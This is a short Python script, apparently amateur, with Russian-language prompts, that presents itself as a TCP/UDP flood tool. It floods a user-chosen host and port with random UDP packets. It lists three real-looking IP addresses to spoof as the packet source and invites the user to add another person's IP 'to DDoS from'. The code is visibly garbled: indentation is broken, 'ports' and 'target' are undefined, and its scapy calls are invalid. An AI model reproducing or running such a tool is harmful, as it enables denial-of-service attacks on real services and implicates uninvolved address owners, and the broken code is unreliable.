#good script by ded
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
from random import choice
import requests
import socket
try:
    from scapy.all import *
    from scapy.layers.inet import TCP, IP
    is_erroring = True
except:
    pass

# http://m.bibika.ru/
os.system("clear")
print("З А Г Р У З К А....")
time.sleep(2.5)
os.system("clear")

# http://m.bibika.ru/


print("###########################")
print("###### TCP/UDP FLOOD ######")
print("###########################")
ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']

if input('Вы хотите ввести чужой IP для DDoS с него? (y/n) ') == 'y':
    user_ip = input('Введите IP: => ')
    ips.append(user_ip)


ip = str(input(" HOST/IP:=> "))
port = int(input(" PORT:=> "))
choice = str(input(" UDP(Y/N):=> "))	
times = int(input(" PACKETS/Time:=> "))
threads = int(input(" THREADS/Потоки:=> "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK!!!")
        except:
                        print("[!] ATTACK!!!")
                    ip = choice(ips)
                    port = int(choice(ports))
                    IP1 = IP(source_IP=choice(ips), destination=target)
                    TCP1 = TCP(srcport=choice(ips), dstport=80)
                    pkt = IP1 / TCP1
                    send(pkt, inter=.001)
